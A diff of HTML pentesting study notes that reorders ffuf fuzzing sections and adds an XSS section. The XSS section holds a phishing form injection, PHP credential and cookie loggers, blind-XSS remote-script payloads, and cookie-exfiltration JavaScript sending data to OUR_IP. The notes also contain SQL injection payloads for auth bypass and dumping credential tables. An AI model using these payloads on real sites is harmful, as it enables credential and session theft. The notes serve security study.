@@ -861,8 +861,19 @@ don’t give <code>ffuf</code> too much power because it could lead in a
 <code>DoS</code>.</p>
 <pre class="shell"><code>$ ffuf -w &lt;SNIP&gt; -u &lt;SNIP&gt; -t 200</code></pre>
 </div>
-<div id="directory-fuzzing" class="slide section level3" number="1.6.2">
-<h1><span class="header-section-number">1.6.2</span> Directory
+<div id="subdomain-fuzzing" class="slide section level3" number="1.6.2">
+<h1><span class="header-section-number">1.6.2</span> Subdomain
+Fuzzing</h1>
+<pre class="shell"><code>$ ffuf -w SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.example.com/</code></pre>
+</div>
+<div id="vhost-fuzzing" class="slide section level3" number="1.6.3">
+<h1><span class="header-section-number">1.6.3</span> Vhost Fuzzing</h1>
+<pre class="shell"><code>$ ffuf -w SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://example.com:PORT/ -H &#39;Host: FUZZ.example.com&#39; -fs xxx</code></pre>
+<pre><code>*(-H &#39;Host: FUZZ.example.com&#39; = Header `&quot;Name: Value&quot;`, separated by colon
+  -fs xxx                     = filter all incorrect results)</code></pre>
+</div>
+<div id="directory-fuzzing" class="slide section level3" number="1.6.4">
+<h1><span class="header-section-number">1.6.4</span> Directory
 Fuzzing</h1>
 <p>With the <code>-w</code> flag we can pass our wordlist, with
 <code>-u</code> the URL we want to fuzz. To tell <code>ffuf</code> where
@@ -870,33 +881,25 @@ we want to fuzz, we need to place the <code>FUZZ</code> keyword this can
 look like the following command:</p>
 <pre class="shell"><code>$ ffuf -w SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ</code></pre>
 </div>
-<div id="page-fuzzing" class="slide section level3" number="1.6.3">
-<h1><span class="header-section-number">1.6.3</span> Page Fuzzing</h1>
+<div id="page-fuzzing" class="slide section level3" number="1.6.5">
+<h1><span class="header-section-number">1.6.5</span> Page Fuzzing</h1>
 <p>If we want, we can combine two keywords in one search. For that we
 can use <code>FUZZ_1.FUZZ_2</code>. #### Extension Fuzzing</p>
 <pre class="shell"><code>$ ffuf -w SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/blog/indexFUZZ</code></pre>
-<h4 id="page-fuzzing-1"><span class="header-section-number">1.6.3.1</span> Page Fuzzing</h4>
+<h4 id="page-fuzzing-1"><span class="header-section-number">1.6.5.1</span> Page Fuzzing</h4>
 <pre class="shell"><code>$ ffuf -w SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php</code></pre>
 </div>
-<div id="recursive-fuzzing" class="slide section level3" number="1.6.4">
-<h1><span class="header-section-number">1.6.4</span> Recursive
+<div id="recursive-fuzzing" class="slide section level3" number="1.6.6">
+<h1><span class="header-section-number">1.6.6</span> Recursive
 Fuzzing</h1>
+<p>If there are several file extensions to check, we need to separate
+them with a ‘<code>,</code>’. Like this:
+<code>-e .php,.php7,.phps</code>.</p>
 <pre class="shell"><code>$ ffuf -w SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v</code></pre>
 <pre class="text"><code>*(-recursion              = scans the directory recursive
   -recursion-depth 1      = only fuzz the current directory and their direct sub-directories
   -e .php                 = specify the extension
   -v                      = output the full URLs)</code></pre>
-</div>
-<div id="subdomain-fuzzing" class="slide section level3" number="1.6.5">
-<h1><span class="header-section-number">1.6.5</span> Subdomain
-Fuzzing</h1>
-<pre class="shell"><code>$ ffuf -w SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.example.com/</code></pre>
-</div>
-<div id="vhost-fuzzing" class="slide section level3" number="1.6.6">
-<h1><span class="header-section-number">1.6.6</span> Vhost Fuzzing</h1>
-<pre class="shell"><code>$ ffuf -w SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://example.com:PORT/ -H &#39;Host: FUZZ.example.com&#39; -fs xxx</code></pre>
-<pre><code>*(-H &#39;Host: FUZZ.example.com&#39; = Header `&quot;Name: Value&quot;`, separated by colon
-  -fs xxx                     = filter all incorrect results)</code></pre>
 </div>
 <div id="parameter-fuzzing" class="slide section level3" number="1.6.7">
 <h1><span class="header-section-number">1.6.7</span> Parameter
@@ -995,16 +998,126 @@ FTP-Service:</p>
   run                           = Run the exploit)</code></pre>
 <p>For further information see the following documentation: <a href="https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/">offensive-security.com</a></p>
 </div>
-<div id="sql-injection" class="slide section level3" number="1.7.8">
-<h1><span class="header-section-number">1.7.8</span> SQL injection</h1>
-<h4 id="types"><span class="header-section-number">1.7.8.1</span>
+<div id="cross-site-scripting-xss" class="slide section level3" number="1.7.8">
+<h1><span class="header-section-number">1.7.8</span> Cross-Site
+Scripting (XSS)</h1>
+<p>Check malicious code against any input fields &amp; HTTP-Header(i.e.,
+when their values are displayed on the page) on a webpage.</p>
+<h4 id="xss-discovery"><span class="header-section-number">1.7.8.1</span> XSS Discovery</h4>
+<h5 id="automated-discovery"><span class="header-section-number">1.7.8.1.1</span> Automated Discovery</h5>
+<p>Tools: 1. <a href="https://www.tenable.com/products/nessus">Nessus</a> 2. <a href="https://portswigger.net/burp/pro">Burp Pro</a> 3. <a href="https://owasp.org/www-project-zap/">ZAP</a> 4. <a href="https://github.com/s0md3v/XSStrike">XSS Strike</a> 5. <a href="https://github.com/rajeshmajumdar/BruteXSS">Brute XSS</a> 6. <a href="https://github.com/epsylon/xsser">XSSer</a></p>
+<h5 id="manual-discovery"><span class="header-section-number">1.7.8.1.2</span> Manual Discovery</h5>
+<h6 id="xss-payload"><span class="header-section-number">1.7.8.1.2.1</span> XSS Payload</h6>
+<ol style="list-style-type: decimal">
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md">PayloadsAllTheThings</a></li>
+<li><a href="https://github.com/payloadbox/xss-payload-list">PayloadBox</a></li>
+</ol>
+<h4 id="defacing-elements"><span class="header-section-number">1.7.8.2</span> Defacing Elements</h4>
+<ul>
+<li>Background Color <code>document.body.style.background</code></li>
+<li>Background <code>document.body.background</code></li>
+<li>Page Title <code>document.title</code></li>
+<li>Page Text <code>DOM.innerHTML</code></li>
+</ul>
+<h4 id="phishing"><span class="header-section-number">1.7.8.3</span>
+Phishing</h4>
+<h5 id="login-from-injection"><span class="header-section-number">1.7.8.3.1</span> Login From Injection</h5>
+<div class="sourceCode" id="cb65"><pre class="sourceCode js"><code class="sourceCode javascript"><span id="cb65-1"><a href="#cb65-1" aria-hidden="true" tabindex="-1"></a><span class="bu">document</span><span class="op">.</span><span class="fu">write</span>(<span class="st">&#39;&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;form action=http://OUR_IP&gt;&lt;input type=&quot;username&quot; name=&quot;username&quot; placeholder=&quot;Username&quot;&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot;&gt;&lt;/form&gt;&#39;</span>)<span class="op">;</span></span></code></pre></div>
+<h5 id="cleaning-up"><span class="header-section-number">1.7.8.3.2</span> Cleaning Up</h5>
+<p>If there are Elements we won’t have on the webpage anymore, we can
+remove them with the following code:</p>
+<div class="sourceCode" id="cb66"><pre class="sourceCode js"><code class="sourceCode javascript"><span id="cb66-1"><a href="#cb66-1" aria-hidden="true" tabindex="-1"></a><span class="bu">document</span><span class="op">.</span><span class="fu">getElementById</span>(<span class="st">&#39;urlform&#39;</span>)<span class="op">.</span><span class="fu">remove</span>()<span class="op">;</span></span></code></pre></div>
+<h5 id="credential-stealing"><span class="header-section-number">1.7.8.3.3</span> Credential Stealing</h5>
+<pre class="shell"><code>$ mkdir /tmp/tmpserver
+$ cd /tmp/tmpserver
+$ vi index.php #at this step we wrote our index.php file
+$ sudo php -S 0.0.0.0:80
+PHP 7.4.15 Development Server (http://0.0.0.0:80) started</code></pre>
+<div class="sourceCode" id="cb68"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb68-1"><a href="#cb68-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span></span>
+<span id="cb68-2"><a href="#cb68-2" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> (<span class="kw">isset</span>(<span class="va">$_GET</span>[<span class="st">&#39;username&#39;</span>]) <span class="op">&amp;&amp;</span> <span class="kw">isset</span>(<span class="va">$_GET</span>[<span class="st">&#39;password&#39;</span>])) {</span>
+<span id="cb68-3"><a href="#cb68-3" aria-hidden="true" tabindex="-1"></a>    <span class="va">$file</span> <span class="op">=</span> <span class="fu">fopen</span>(<span class="st">&quot;creds.txt&quot;</span><span class="ot">,</span> <span class="st">&quot;a+&quot;</span>)<span class="ot">;</span></span>
+<span id="cb68-4"><a href="#cb68-4" aria-hidden="true" tabindex="-1"></a>    <span class="fu">fputs</span>(<span class="va">$file</span><span class="ot">,</span> <span class="st">&quot;Username: </span>{<span class="va">$_GET</span>[<span class="st">&#39;username&#39;</span>]}<span class="st"> | Password: </span>{<span class="va">$_GET</span>[<span class="st">&#39;password&#39;</span>]}<span class="sc">\n</span><span class="st">&quot;</span>)<span class="ot">;</span></span>
+<span id="cb68-5"><a href="#cb68-5" aria-hidden="true" tabindex="-1"></a>    <span class="fu">header</span>(<span class="st">&quot;Location: http://SERVER_IP/phishing/index.php&quot;</span>)<span class="ot">;</span></span>
+<span id="cb68-6"><a href="#cb68-6" aria-hidden="true" tabindex="-1"></a>    <span class="fu">fclose</span>(<span class="va">$file</span>)<span class="ot">;</span></span>
+<span id="cb68-7"><a href="#cb68-7" aria-hidden="true" tabindex="-1"></a>    <span class="cf">exit</span>()<span class="ot">;</span></span>
+<span id="cb68-8"><a href="#cb68-8" aria-hidden="true" tabindex="-1"></a>}</span>
+<span id="cb68-9"><a href="#cb68-9" aria-hidden="true" tabindex="-1"></a><span class="kw">?&gt;</span></span></code></pre></div>
+<h4 id="session-hijacking"><span class="header-section-number">1.7.8.4</span> Session Hijacking</h4>
+<h5 id="blind-xss-detection"><span class="header-section-number">1.7.8.4.1</span> Blind XSS Detection</h5>
+<p>A Blind XSS vulnerability occurs when the vulnerability is triggered
+on a page we don’t have access to.</p>
+<p>Can be found at: - Contact Forms - Reviews - User Details - Support
+Tickets - HTTP User-Agent header</p>
+<h5 id="loading-a-remote-script"><span class="header-section-number">1.7.8.4.2</span> Loading a Remote
+Script</h5>
+<p>Since we can’t see how the website processes the output, we need to
+find a way to get this information. Therefor we can load remote scripts
+from a machine of our choice, which is under our control.</p>
+<p>To identify the vulnerable target, we can use a suitable name for our
+requests. If we have an input filed which requires a username, we could
+generate a request for <code>/username</code>:</p>
+<div class="sourceCode" id="cb69"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb69-1"><a href="#cb69-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;script</span> <span class="er">src</span><span class="ot">=</span><span class="st">&quot;http://OUR_IP/username&quot;</span><span class="kw">&gt;&lt;/script&gt;</span></span></code></pre></div>
+<p>Some more examples:</p>
+<div class="sourceCode" id="cb70"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb70-1"><a href="#cb70-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;script</span> <span class="er">src</span><span class="ot">=</span><span class="st">http://OUR_IP</span><span class="kw">&gt;&lt;/script&gt;</span></span>
+<span id="cb70-2"><a href="#cb70-2" aria-hidden="true" tabindex="-1"></a>&#39;&gt;<span class="kw">&lt;script</span> <span class="er">src</span><span class="ot">=</span><span class="st">http://OUR_IP</span><span class="kw">&gt;&lt;/script&gt;</span></span>
+<span id="cb70-3"><a href="#cb70-3" aria-hidden="true" tabindex="-1"></a>&quot;&gt;<span class="kw">&lt;script</span> <span class="er">src</span><span class="ot">=</span><span class="st">http://OUR_IP</span><span class="kw">&gt;&lt;/script&gt;</span></span>
+<span id="cb70-4"><a href="#cb70-4" aria-hidden="true" tabindex="-1"></a>javascript:eval(&#39;var a=document.createElement(\&#39;script\&#39;);a.src=\&#39;http://OUR_IP\&#39;;document.body.appendChild(a)&#39;)</span>
+<span id="cb70-5"><a href="#cb70-5" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;script&gt;function</span> <span class="fu">b</span>(){<span class="pp">eval</span>(<span class="kw">this</span><span class="op">.</span><span class="at">responseText</span>)}<span class="op">;</span>a<span class="op">=</span><span class="kw">new</span> <span class="bu">XMLHttpRequest</span>()<span class="op">;</span>a<span class="op">.</span><span class="fu">addEventListener</span>(<span class="st">&quot;load&quot;</span><span class="op">,</span> b)<span class="op">;</span>a<span class="op">.</span><span class="fu">open</span>(<span class="st">&quot;GET&quot;</span><span class="op">,</span> <span class="st">&quot;//OUR_IP&quot;</span>)<span class="op">;</span>a<span class="op">.</span><span class="fu">send</span>()<span class="op">;</span><span class="kw">&lt;/script&gt;</span></span>
+<span id="cb70-6"><a href="#cb70-6" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;script&gt;</span>$<span class="op">.</span><span class="fu">getScript</span>(<span class="st">&quot;http://OUR_IP&quot;</span>)<span class="kw">&lt;/script&gt;</span></span></code></pre></div>
+<p>Also have a look in the <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss">PayloadsAllTheThings</a>
+Project.</p>
+<p>In order to handle the requests, we need to start a listener on our
+machine:</p>
+<pre class="shell"><code>$ mkdir /tmp/tmpserver
+$ cd /tmp/tmpserver
+$ vi index.php #at this step we wrote our index.php file
+$ sudo php -S 0.0.0.0:80
+PHP 7.4.15 Development Server (http://0.0.0.0:80) started</code></pre>
+<div class="sourceCode" id="cb72"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb72-1"><a href="#cb72-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span></span>
+<span id="cb72-2"><a href="#cb72-2" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> (<span class="kw">isset</span>(<span class="va">$_GET</span>[<span class="st">&#39;username&#39;</span>]) <span class="op">&amp;&amp;</span> <span class="kw">isset</span>(<span class="va">$_GET</span>[<span class="st">&#39;password&#39;</span>])) {</span>
+<span id="cb72-3"><a href="#cb72-3" aria-hidden="true" tabindex="-1"></a>    <span class="va">$file</span> <span class="op">=</span> <span class="fu">fopen</span>(<span class="st">&quot;creds.txt&quot;</span><span class="ot">,</span> <span class="st">&quot;a+&quot;</span>)<span class="ot">;</span></span>
+<span id="cb72-4"><a href="#cb72-4" aria-hidden="true" tabindex="-1"></a>    <span class="fu">fputs</span>(<span class="va">$file</span><span class="ot">,</span> <span class="st">&quot;Username: </span>{<span class="va">$_GET</span>[<span class="st">&#39;username&#39;</span>]}<span class="st"> | Password: </span>{<span class="va">$_GET</span>[<span class="st">&#39;password&#39;</span>]}<span class="sc">\n</span><span class="st">&quot;</span>)<span class="ot">;</span></span>
+<span id="cb72-5"><a href="#cb72-5" aria-hidden="true" tabindex="-1"></a>    <span class="fu">header</span>(<span class="st">&quot;Location: http://SERVER_IP/phishing/index.php&quot;</span>)<span class="ot">;</span></span>
+<span id="cb72-6"><a href="#cb72-6" aria-hidden="true" tabindex="-1"></a>    <span class="fu">fclose</span>(<span class="va">$file</span>)<span class="ot">;</span></span>
+<span id="cb72-7"><a href="#cb72-7" aria-hidden="true" tabindex="-1"></a>    <span class="cf">exit</span>()<span class="ot">;</span></span>
+<span id="cb72-8"><a href="#cb72-8" aria-hidden="true" tabindex="-1"></a>}</span>
+<span id="cb72-9"><a href="#cb72-9" aria-hidden="true" tabindex="-1"></a><span class="kw">?&gt;</span></span></code></pre></div>
+<h5 id="session-hijacking-1"><span class="header-section-number">1.7.8.4.3</span> Session Hijacking</h5>
+<p>Now that we know where we should place our vulnerable payload and the
+fitting payload itself too, we first need to create a script to resolve
+our xss request. For example one of the following:</p>
+<div class="sourceCode" id="cb73"><pre class="sourceCode js"><code class="sourceCode javascript"><span id="cb73-1"><a href="#cb73-1" aria-hidden="true" tabindex="-1"></a><span class="bu">document</span><span class="op">.</span><span class="at">location</span><span class="op">=</span><span class="st">&#39;http://OUR_IP/index.php?c=&#39;</span><span class="op">+</span><span class="bu">document</span><span class="op">.</span><span class="at">cookie</span><span class="op">;</span></span>
+<span id="cb73-2"><a href="#cb73-2" aria-hidden="true" tabindex="-1"></a><span class="kw">new</span> <span class="fu">Image</span>()<span class="op">.</span><span class="at">src</span><span class="op">=</span><span class="st">&#39;http://OUR_IP/index.php?c=&#39;</span><span class="op">+</span><span class="bu">document</span><span class="op">.</span><span class="at">cookie</span><span class="op">;</span></span></code></pre></div>
+<p>Once done we can use our .php file from the section above again. But
+we need to adjust it a bit:</p>
+<div class="sourceCode" id="cb74"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb74-1"><a href="#cb74-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span></span>
+<span id="cb74-2"><a href="#cb74-2" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> (<span class="kw">isset</span>(<span class="va">$_GET</span>[<span class="st">&#39;c&#39;</span>])) {</span>
+<span id="cb74-3"><a href="#cb74-3" aria-hidden="true" tabindex="-1"></a>    <span class="va">$list</span> <span class="op">=</span> <span class="fu">explode</span>(<span class="st">&quot;;&quot;</span><span class="ot">,</span> <span class="va">$_GET</span>[<span class="st">&#39;c&#39;</span>])<span class="ot">;</span></span>
+<span id="cb74-4"><a href="#cb74-4" aria-hidden="true" tabindex="-1"></a>    <span class="cf">foreach</span> (<span class="va">$list</span> <span class="kw">as</span> <span class="va">$key</span> =&gt; <span class="va">$value</span>) {</span>
+<span id="cb74-5"><a href="#cb74-5" aria-hidden="true" tabindex="-1"></a>        <span class="va">$cookie</span> <span class="op">=</span> <span class="fu">urldecode</span>(<span class="va">$value</span>)<span class="ot">;</span></span>
+<span id="cb74-6"><a href="#cb74-6" aria-hidden="true" tabindex="-1"></a>        <span class="va">$file</span> <span class="op">=</span> <span class="fu">fopen</span>(<span class="st">&quot;cookies.txt&quot;</span><span class="ot">,</span> <span class="st">&quot;a+&quot;</span>)<span class="ot">;</span></span>
+<span id="cb74-7"><a href="#cb74-7" aria-hidden="true" tabindex="-1"></a>        <span class="fu">fputs</span>(<span class="va">$file</span><span class="ot">,</span> <span class="st">&quot;Victim IP: </span>{<span class="va">$_SERVER</span>[<span class="st">&#39;REMOTE_ADDR&#39;</span>]}<span class="st"> | Cookie: </span>{<span class="va">$cookie</span>}<span class="sc">\n</span><span class="st">&quot;</span>)<span class="ot">;</span></span>
+<span id="cb74-8"><a href="#cb74-8" aria-hidden="true" tabindex="-1"></a>        <span class="fu">fclose</span>(<span class="va">$file</span>)<span class="ot">;</span></span>
+<span id="cb74-9"><a href="#cb74-9" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb74-10"><a href="#cb74-10" aria-hidden="true" tabindex="-1"></a>}</span>
+<span id="cb74-11"><a href="#cb74-11" aria-hidden="true" tabindex="-1"></a><span class="kw">?&gt;</span></span></code></pre></div>
+<p>Let’s start our listener:</p>
+<pre class="shell"><code>$ sudo php -S 0.0.0.0:80
+PHP 7.4.15 Development Server (http://0.0.0.0:80) started</code></pre>
+<p>Now we can place our early discovered payload again, but this time we
+request the <code>/script.js</code>.</p>
+<div class="sourceCode" id="cb76"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb76-1"><a href="#cb76-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;script</span> <span class="er">src</span><span class="ot">=</span><span class="st">http://OUR_IP/script.js</span><span class="kw">&gt;&lt;/script&gt;</span></span></code></pre></div>
+</div>
+<div id="sql-injection" class="slide section level3" number="1.7.9">
+<h1><span class="header-section-number">1.7.9</span> SQL injection</h1>
+<h4 id="types"><span class="header-section-number">1.7.9.1</span>
 Types</h4>
 <ol style="list-style-type: decimal">
 <li>In-band 1.1 Union Based 1.1 Error Based</li>
 <li>Blind 2.1 Boolean Based 2.2 Time Based</li>
 <li>Out-of-band</li>
 </ol>
-<h4 id="sqli-discovery"><span class="header-section-number">1.7.8.2</span> SQLi Discovery</h4>
+<h4 id="sqli-discovery"><span class="header-section-number">1.7.9.2</span> SQLi Discovery</h4>
 <table>
 <thead>
 <tr class="header">
@@ -1039,12 +1152,12 @@ Types</h4>
 from the webpage, we can assume that there is a SQL injection
 possible.</p>
 <p>For example, we can now try an <code>OR Injection</code>.</p>
-<div class="sourceCode" id="cb65"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb65-1"><a href="#cb65-1" aria-hidden="true" tabindex="-1"></a>admin<span class="st">&#39; or &#39;</span><span class="dv">1</span><span class="st">&#39;=&#39;</span><span class="dv">1</span></span></code></pre></div>
+<div class="sourceCode" id="cb77"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb77-1"><a href="#cb77-1" aria-hidden="true" tabindex="-1"></a>admin<span class="st">&#39; or &#39;</span><span class="dv">1</span><span class="st">&#39;=&#39;</span><span class="dv">1</span></span></code></pre></div>
 <p>When there is no hint for a valid username we can repeat this for the
 password.</p>
 <p>For more Payloads please have a look in the <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass">PayloadsAllTheThings
 Project</a>.</p>
-<h4 id="comments"><span class="header-section-number">1.7.8.3</span>
+<h4 id="comments"><span class="header-section-number">1.7.9.3</span>
 Comments</h4>
 <table>
 <colgroup>
@@ -1072,7 +1185,7 @@ Comments</h4>
 </tr>
 </tbody>
 </table>
-<h4 id="union-clause"><span class="header-section-number">1.7.8.4</span>
+<h4 id="union-clause"><span class="header-section-number">1.7.9.4</span>
 Union Clause</h4>
 <p>If we use the union clause it is important that we ensure that the
 data type on the selected columns are the same.</p>
@@ -1080,12 +1193,12 @@ data type on the selected columns are the same.</p>
 union it with another single column. In that case, we have to add
 another column and fill it with junk. For example <code>NULL</code>,
 because it fits all data types.</p>
-<div class="sourceCode" id="cb66"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb66-1"><a href="#cb66-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">from</span> products <span class="kw">where</span> product_id <span class="op">=</span> <span class="st">&#39;1&#39;</span> <span class="kw">UNION</span> <span class="kw">SELECT</span> username, <span class="kw">NULL</span> <span class="kw">from</span> passwords</span></code></pre></div>
-<h4 id="union-injection"><span class="header-section-number">1.7.8.5</span> Union Injection</h4>
+<div class="sourceCode" id="cb78"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb78-1"><a href="#cb78-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">from</span> products <span class="kw">where</span> product_id <span class="op">=</span> <span class="st">&#39;1&#39;</span> <span class="kw">UNION</span> <span class="kw">SELECT</span> username, <span class="kw">NULL</span> <span class="kw">from</span> passwords</span></code></pre></div>
+<h4 id="union-injection"><span class="header-section-number">1.7.9.5</span> Union Injection</h4>
 <p>To check the amount of columns we can use the <code>ORDER BY</code>
 or <code>UNION</code> function. If we exceed the number of columns we
 generate an error and therefore know the maximum number.</p>
-<div class="sourceCode" id="cb67"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb67-1"><a href="#cb67-1" aria-hidden="true" tabindex="-1"></a>anything<span class="st">&#39; UNION select 1,2,3-- </span></span></code></pre></div>
+<div class="sourceCode" id="cb79"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb79-1"><a href="#cb79-1" aria-hidden="true" tabindex="-1"></a>anything<span class="st">&#39; UNION select 1,2,3-- </span></span></code></pre></div>
 <pre class="test"><code>Dont forget the whitespace after the double dash!</code></pre>
 <p>As a part of our <code>UNION</code> injection we can try to determine
 more information about the database.</p>
@@ -1119,66 +1232,66 @@ more information about the database.</p>
 </tr>
 </tbody>
 </table>
-<h4 id="enumeration"><span class="header-section-number">1.7.8.6</span>
+<h4 id="enumeration"><span class="header-section-number">1.7.9.6</span>
 Enumeration</h4>
 <p>To get data with a <code>UNION SELECT</code> we need to create proper
 <code>SELECT</code> queries. Therefor it is essential for us to know the
 schema conditions. This can be realized by enumeration.</p>
 <p>In our first step, we want to know what databases are present on the
 system. A matching injection could look like the following:</p>
-<div class="sourceCode" id="cb69"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb69-1"><a href="#cb69-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- </span></span></code></pre></div>
+<div class="sourceCode" id="cb81"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb81-1"><a href="#cb81-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- </span></span></code></pre></div>
 <p>Now that we have an overview of the databases, let’s see which one we
 are in.</p>
-<div class="sourceCode" id="cb70"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb70-1"><a href="#cb70-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; UNION select 1,database(),2,3-- </span></span></code></pre></div>
+<div class="sourceCode" id="cb82"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb82-1"><a href="#cb82-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; UNION select 1,database(),2,3-- </span></span></code></pre></div>
 <p>An overview over the different tables could look like the
 following:</p>
-<div class="sourceCode" id="cb71"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb71-1"><a href="#cb71-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema=&#39;</span>dev<span class="st">&#39;-- </span></span></code></pre></div>
+<div class="sourceCode" id="cb83"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb83-1"><a href="#cb83-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema=&#39;</span>dev<span class="st">&#39;-- </span></span></code></pre></div>
 <p>The last information that we need are the name of the columns.</p>
-<div class="sourceCode" id="cb72"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb72-1"><a href="#cb72-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name=&#39;</span>credentials<span class="st">&#39;-- </span></span></code></pre></div>
+<div class="sourceCode" id="cb84"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb84-1"><a href="#cb84-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name=&#39;</span>credentials<span class="st">&#39;-- </span></span></code></pre></div>
 <p>Now that we have all the information, we can start querying data.</p>
-<div class="sourceCode" id="cb73"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb73-1"><a href="#cb73-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; UNION select 1, username, password, 4 from dev.credentials-- </span></span></code></pre></div>
-<h4 id="reading-files"><span class="header-section-number">1.7.8.7</span> Reading Files</h4>
+<div class="sourceCode" id="cb85"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb85-1"><a href="#cb85-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; UNION select 1, username, password, 4 from dev.credentials-- </span></span></code></pre></div>
+<h4 id="reading-files"><span class="header-section-number">1.7.9.7</span> Reading Files</h4>
 <p>There are two ways (<code>UNION SELECT</code> or <code>SELECT</code>)
 to check which rights our user has.</p>
-<div class="sourceCode" id="cb74"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb74-1"><a href="#cb74-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="fu">USER</span>()</span>
-<span id="cb74-2"><a href="#cb74-2" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> CURRENT_USER()</span>
-<span id="cb74-3"><a href="#cb74-3" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="fu">user</span> <span class="kw">from</span> mysql.<span class="fu">user</span></span></code></pre></div>
-<div class="sourceCode" id="cb75"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb75-1"><a href="#cb75-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; UNION SELECT 1, user(), 3, 4-- </span></span></code></pre></div>
-<div class="sourceCode" id="cb76"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb76-1"><a href="#cb76-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; UNION SELECT 1, user, 3, 4 from mysql.user-- </span></span></code></pre></div>
-<h5 id="user-privileges"><span class="header-section-number">1.7.8.7.1</span> User Privileges</h5>
+<div class="sourceCode" id="cb86"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb86-1"><a href="#cb86-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="fu">USER</span>()</span>
+<span id="cb86-2"><a href="#cb86-2" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> CURRENT_USER()</span>
+<span id="cb86-3"><a href="#cb86-3" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="fu">user</span> <span class="kw">from</span> mysql.<span class="fu">user</span></span></code></pre></div>
